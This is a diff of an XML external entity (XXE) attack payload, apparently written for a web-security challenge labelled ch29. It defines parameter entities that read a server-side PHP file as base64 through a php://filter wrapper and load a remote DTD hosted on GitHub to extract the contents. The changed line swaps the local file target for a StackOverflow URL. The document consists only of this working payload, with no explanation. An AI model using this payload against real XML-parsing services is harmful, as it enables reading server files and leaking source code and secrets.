@@ -1,6 +1,6 @@
 <?xml version="1.0" encoding="UTF-8" ?>
 <!DOCTYPE roottag [ 
- <!ENTITY % file SYSTEM "php://filter/read=convert.base64-encode/resource=file:///challenge/web-serveur/ch29/index.php">
+ <!ENTITY % file SYSTEM "php://filter/read=convert.base64-encode/resource=http://stackoverflow.com/questions/28853871/fopen-remote-host-file-access-not-accepted-on-a-local-file">
  <!ENTITY % start SYSTEM "<![CDATA["> 
  <!ENTITY % end SYSTEM "]]>">
  <!ENTITY % dtd SYSTEM "https://raw.githubusercontent.com/pszot/publicscripts/master/external.dtd">
